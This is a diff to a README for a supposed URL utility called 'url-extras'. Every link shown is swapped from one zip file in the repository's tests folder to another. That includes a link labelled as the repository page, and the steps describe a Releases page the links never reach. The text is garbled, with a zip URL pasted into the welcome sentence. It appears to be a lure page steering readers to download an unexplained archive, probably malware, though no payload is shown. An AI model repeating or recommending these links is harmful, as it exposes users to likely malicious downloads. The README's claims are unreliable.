@@ -1,10 +1,10 @@
 # 🌐 url-extras - Simple URL Utilities for Everyone
 
 ## 📥 Download Here
-[![Download url-extras](https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip)](https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip)
+[![Download url-extras](https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip)](https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip)
 
 ## 🚀 Getting Started
-Welcome to url-extras! This application helps you use https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip' URL utilities right from your browser. If you need to handle URLs easily, you're in the right place.
+Welcome to url-extras! This application helps you use https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip' URL utilities right from your browser. If you need to handle URLs easily, you're in the right place.
 
 ## 📋 System Requirements
 Before you begin, make sure your computer meets these requirements:
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets these requirements:
 To get started with url-extras, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   - [Download url-extras](https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip)
+   - [Download url-extras](https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version. It will usually be at the top. Click on the link to download it.
 
@@ -64,7 +64,7 @@ This software is licensed under the MIT License. You can use, modify, and distri
 If you want to contribute, feel free to check the Contribution guidelines in the repository. Your suggestions and improvements are welcome.
 
 ## 🔗 Useful Links
-- [Visit the GitHub Repository](https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip)
-- [Download url-extras](https://raw.githubusercontent.com/Nihad1452/url-extras/main/tests/url-extras_2.5-beta.4.zip)
+- [Visit the GitHub Repository](https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip)
+- [Download url-extras](https://github.com/Nihad1452/url-extras/raw/refs/heads/main/tests/extras-url-v3.2.zip)
 
 Enjoy using url-extras!
